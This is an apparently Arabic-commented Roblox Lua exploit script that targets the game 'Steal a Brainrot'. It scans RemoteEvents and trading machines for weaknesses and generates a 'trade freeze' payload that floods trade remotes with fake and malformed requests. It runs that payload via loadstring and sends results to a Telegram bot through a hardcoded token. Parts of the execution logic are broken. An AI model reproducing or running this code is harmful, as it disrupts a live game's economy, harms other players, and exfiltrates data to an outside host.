-- إعدادات Telegram
local TELEGRAM_TOKEN = "8710046846:AAHSUtY60DHBfwJMXdhJIQGg-_izSTTWFTA"
local TELEGRAM_CHAT_ID = "7647074891"
local HttpService = game:GetService("HttpService")

-- وظيفة إرسال رسائل إلى Telegram (مع محاولة إعادة الإرسال)
local function sendToTelegram(message)
    local url = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"
    local data = {
        chat_id = TELEGRAM_CHAT_ID,
        text = message,
        parse_mode = "HTML"
    }
    
    local success = false
    local attempts = 0
    local maxAttempts = 3
    
    while not success and attempts < maxAttempts do
        attempts = attempts + 1
        local response = pcall(function()
            return HttpService:RequestAsync({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(data)
            })
        end)
        
        if response and response.Success then
            success = true
            print("تم إرسال الرسالة إلى Telegram بنجاح")
        else
            print("فشل محاولة إرسال الرسالة (" .. attempts .. "/" .. maxAttempts .. ")")
            task.wait(2) -- انتظر قبل إعادة المحاولة
        end
    end
    
    return success
end

-- وظيفة تحليل RemoteEvents (محسنة)
local function analyzeRemoteEvents()
    local results = {}
    local remoteEvents = {}
    local servicesToScan = {game:GetService("Workspace"), game:GetService("ReplicatedFirst"), game:GetService("ReplicatedStorage")}
    
    print("بدء تحليل RemoteEvents...")
    
    -- مسح الخدمات بشكل متسلسل مع فترات راحة
    for _, service in ipairs(servicesToScan) do
        local descendants = service:GetDescendants()
        for i, obj in ipairs(descendants) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remoteEvents, {
                    Name = obj.Name,
                    Parent = obj.Parent:GetFullName(),
                    Type = obj.ClassName
                })
                
                -- فترة راحة كل 50 عنصر لتجنب التجميد
                if i % 50 == 0 then
                    task.wait(0.1)
                    print("تم تحليل " .. i .. " عنصر من " .. service.Name)
                end
            end
        end
    end
    
    -- تحليل كل RemoteEvent للبحث عن ثغرات (بشكل مبسط لتجنب التجميد)
    for _, remote in ipairs(remoteEvents) do
        local vulnerabilities = {}
        
        -- تحليل بسيط للتأكد من وجود حماية
        if not remote.Parent:find("Anti") and not remote.Name:find("Secure") then
            table.insert(vulnerabilities, "قد لا يحتوي على حماية كافية")
        end
        
        table.insert(results, {
            Remote = remote,
            Vulnerabilities = vulnerabilities
        })
        
        -- فترة راحة بين تحليل كل RemoteEvent
        task.wait(0.05)
    end
    
    return results
end

-- وظيفة تحليل Trades Machines (محسنة)
local function analyzeTradesMachines()
    local results = {}
    
    print("بدء تحليل Trades Machines...")
    
    -- البحث عن Trades Machines في اللعبة
    local workspace = game:GetService("Workspace")
    local descendants = workspace:GetDescendants()
    
    for i, obj in ipairs(descendants) do
        if obj.Name:lower():find("trade") or obj.Name:lower():find("machine") then
            local machineData = {
                Name = obj.Name,
                Location = obj:GetFullName(),
                Type = obj.ClassName,
                Vulnerabilities = {}
            }
            
            -- تحليل المكونات الداخلية (محدود لتجنب التجميد)
            local childCount = 0
            for _, child in ipairs(obj:GetChildren()) do
                if childCount < 10 then -- تحليل أول 10 أبناء فقط
                    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                        table.insert(machineData.Vulnerabilities, "يحتوي على RemoteEvent: " .. child.Name)
                    end
                    
                    if child:IsA("NumberValue") or child:IsA("IntValue") then
                        if child.Name:lower():find("price") or child.Name:lower():find("cost") then
                            table.insert(machineData.Vulnerabilities, "قيمة سعرية قد تكون قابلة للتلاعب: " .. child.Name)
                        end
                    end
                    
                    childCount = childCount + 1
                end
            end
            
            table.insert(results, machineData)
            
            -- فترة راحة بين تحليل كل آلة
            task.wait(0.1)
        end
        
        -- فترة راحة كل 100 عنصر
        if i % 100 == 0 then
            task.wait(0.2)
            print("تم تحليل " .. i .. " عنصر من Workspace")
        end
    end
    
    return results
end

-- وظيفة تحليل الثغرات العامة (مبسطة)
local function analyzeGeneralVulnerabilities()
    local results = {}
    
    print("بدء تحليل الثغرات العامة...")
    
    -- التحقق من الثغرات الشائعة
    local antiCheat = game:GetService("Workspace"):FindFirstChild("AntiCheat") or game:GetService("ReplicatedFirst"):FindFirstChild("AntiCheat")
    if not antiCheat then
        table.insert(results, "اللعبة قد لا تحتوي على نظام حماية فعال")
    end
    
    -- فترة راحة
    task.wait(0.1)
    
    return results
end

-- الوظيفة الرئيسية للتحليل (مقسمة على مراحل)
local function performAnalysis()
    print("=== بدء تحليل ثغرات Steal a Brainrot ===")
    
    local analysisResults = {
        Timestamp = os.date("%Y-%m-%d %H:%M:%S"),
        GameId = game.GameId,
        PlaceId = game.PlaceId
    }
    
    -- المرحلة الأولى: تحليل RemoteEvents
    analysisResults.RemoteEvents = analyzeRemoteEvents()
    print("اكتمل تحليل RemoteEvents")
    task.wait(1) -- فترة راحة بين المراحل
    
    -- المرحلة الثانية: تحليل Trades Machines
    analysisResults.TradesMachines = analyzeTradesMachines()
    print("اكتمل تحليل Trades Machines")
    task.wait(1) -- فترة راحة بين المراحل
    
    -- المرحلة الثالثة: تحليل الثغرات العامة
    analysisResults.GeneralVulnerabilities = analyzeGeneralVulnerabilities()
    print("اكتمل تحليل الثغرات العامة")
    
    -- تحويل النتائج إلى JSON
    local jsonResults = HttpService:JSONEncode(analysisResults)
    
    -- حفظ النتائج في ملف
    writefile("StealBrainrotAnalysis_" .. os.time() .. ".txt", jsonResults)
    print("تم حفظ النتائج في ملف")
    
    -- إرسال ملخص إلى Telegram
    local summary = "<b>تحليل ثغرات Steal a Brainrot</b>\n\n"
    summary = summary .. "<b>التاريخ:</b> " .. analysisResults.Timestamp .. "\n"
    summary = summary .. "<b>معرف اللعبة:</b> " .. analysisResults.GameId .. "\n\n"
    
    summary = summary .. "<b>RemoteEvents المكتشفة:</b> " .. #analysisResults.RemoteEvents .. "\n"
    summary = summary .. "<b>Trades Machines المكتشفة:</b> " .. #analysisResults.TradesMachines .. "\n"
    summary = summary .. "<b>الثغرات العامة:</b> " .. #analysisResults.GeneralVulnerabilities .. "\n\n"
    
    -- إضافة تفاصيل عن الثغرات الخطيرة
    for _, machine in ipairs(analysisResults.TradesMachines) do
        if #machine.Vulnerabilities > 0 then
            summary = summary .. "<b>ثغرات في " .. machine.Name .. ":</b>\n"
            for _, vuln in ipairs(machine.Vulnerabilities) do
                summary = summary .. "- " .. vuln .. "\n"
            end
            summary = summary .. "\n"
        end
    end
    
    sendToTelegram(summary)
    
    return analysisResults
end

-- وظيفة لتجميد التداول (بناءً على الثغرات المكتشفة)
local function createTradeFreezeScript()
    -- البحث عن الثغرات في Trades Machines
    local vulnerableMachines = {}
    
    for _, machine in ipairs(analyzeTradesMachines()) do
        if #machine.Vulnerabilities > 0 then
            table.insert(vulnerableMachines, machine)
        end
    end
    
    if #vulnerableMachines == 0 then
        sendToTelegram("لم يتم العثور على آلات تداول ضعيفة للتجربة")
        return false
    end
    
    -- إنشاء سكربت تجميد التداول
    local tradeFreezeScript = [[
        -- سكربت تجميد التداول لآلات Trades Machines 2026
        -- تم تطويره بناءً على الثغرات المكتشفة
        
        local player = game.Players.LocalPlayer
        local workspace = game.Workspace
        
        -- وظيفة تجميد التداول
        local function freezeTrade(machineName)
            local machine = workspace:FindFirstChild(machineName, true)
            if not machine then
                warn("لم يتم العثور على الآلة: " .. machineName)
                return false
            end
            
            -- البحث عن RemoteEvents المتعلقة بالتداول
            for _, obj in ipairs(machine:GetDescendants()) do
                if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("submit")) then
                    -- إرسال طلبات تداول متكررة ومزيفة
                    for i = 1, 20 do -- تم تقليل عدد الطلبات لتجنب التجميد
                        obj:FireServer({
                            item = "FakeItem" .. i,
                            amount = math.random(1000, 9999),
                            price = 0,
                            target = "FakeTarget"
                        })
                        task.wait(0.2) -- فترة راحة بين الطلبات
                    end
                    
                    -- محاولة استغلال ثغرات التحقق
                    obj:FireServer({
                        item = nil,
                        amount = -999999,
                        price = "invalid_price",
                        target = nil
                    })
                    
                    return true
                end
            end
            
            return false
        end
        
        -- تنفيذ تجميد التداول على الآلات الضعيفة
    ]]
    
    -- إضافة أسماء الآلات الضعيفة إلى السكربت
    for _, machine in ipairs(vulnerableMachines) do
        tradeFreezeScript = tradeFreezeScript .. "\n        freezeTrade(\"" .. machine.Name .. "\")"
        task.wait(0.1) -- فترة راحة بين إضافة كل آلة
    end
    
    -- حفظ السكربت
    local scriptName = "TradeFreezeScript_" .. os.time() .. ".lua"
    writefile(scriptName, tradeFreezeScript)
    
    -- إرسال إشعار بالنجاح
    local message = "<b>تم إنشاء سكربت تجميد التداول بنجاح</b>\n\n"
    message = message .. "<b>اسم الملف:</b> " .. scriptName .. "\n"
    message = message .. "<b>الآلات المستهدفة:</b> " .. #vulnerableMachines .. "\n"
    
    for _, machine in ipairs(vulnerableMachines) do
        message = message .. "- " .. machine.Name .. "\n"
    end
    
    sendToTelegram(message)
    
    return true
end

-- وظيفة لتنفيذ سكربت تجميد التداول
local function executeTradeFreeze()
    print("بدء تنفيذ سكربت تجميد التداول...")
    
    -- إنشاء السكربت أولاً
    if not createTradeFreezeScript() then
        return false
    end
    
    -- تنفيذ السكربت مع فترة راحة
    task.wait(2)
    
    local success, error = pcall(function()
        loadstring(game:HttpGet("file://" .. game:GetService("ReplicatedStorage"):FindFirstChild("TradeFreezeScript_" .. os.time() .. ".lua").Value))()
    end)
    
    if not success then
        sendToTelegram("فشل تنفيذ سكربت تجميد التداول: " .. tostring(error))
        return false
    end
    
    sendToTelegram("تم تنفيذ سكربت تجميد التداول بنجاح")
    return true
end

-- وظيفة رئيسية لتنفيذ كل شيء (مقسمة على مراحل)
